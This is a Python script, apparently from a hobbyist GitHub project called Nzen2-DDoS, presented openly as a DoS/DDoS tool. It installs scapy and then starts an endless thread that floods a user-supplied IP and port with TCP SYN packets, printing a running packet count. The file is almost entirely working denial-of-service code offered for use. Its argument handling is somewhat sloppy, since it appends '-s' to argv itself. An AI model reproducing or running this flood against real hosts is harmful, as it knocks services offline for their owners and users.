#DDoS.py

#Imports:
import os
import sys
import socket
from platform import platform
from os import listdir
os.system('pip3 install scapy')
from scapy.all import *
import threading
version = 'v Alpha 0.5'
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

# Change version in var

title = '''

A DDoS/ DoS script written in Python, the upgraded version of the Batch version.

srforek

 __  _ ___ ___ __  _ ___        __  __   __    __
|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/
| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`.
|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/


'''+version+'''

:DDoS/ DoS python script:

By editor99


Github repo: https://github.com/Gteditor99/DDOS-Nzen2

Youtube: https://www.youtube.com/channel/UCrxNyJTsVtg5pSq3AYbhiAw

Discord: editor99#6207



        '''


logoascii = '''

 __  _ ___ ___ __  _ ___        __  __   __    __
|  \| |_  | __|  \| (_  |  __  | _\| _\ /__\ /' _/
| | ' |/ /| _|| | ' |/ /  |__| | v | v | \/ |`._`.
|_|\__|___|___|_|\__|___|      |__/|__/ \__/ |___/



             '''




#command line arguments
packets_sent = 0


sys.argv.append('-s')
variable = sys.argv[1]
target_ip = sys.argv[2]
target_port = sys.argv[3]

def attack():
    while True:
        p = IP(dst= target_ip) / TCP(flags="S",  sport=RandShort(),  dport=int(target_port))
        send(p , verbose=1, loop=0)
        global packets_sent
        packets_sent += 1
        print("Nzen2-DDos")
        print("{} Packets sent from {} to {}:{} ".format(packets_sent, get_ip_address(), target_ip, target_port))
        os.system('cls')

atk_thread = threading.Thread(target=attack)        

if variable == '-s':
    atk_thread.start()


if len(sys.argv) != 3:
    print("-h:")
    print("\nUsage:\nddos.py -<variable> <target_ip> <target_port>\n")





input("Press Enter to exit:")

# Yo buddy, still alive?
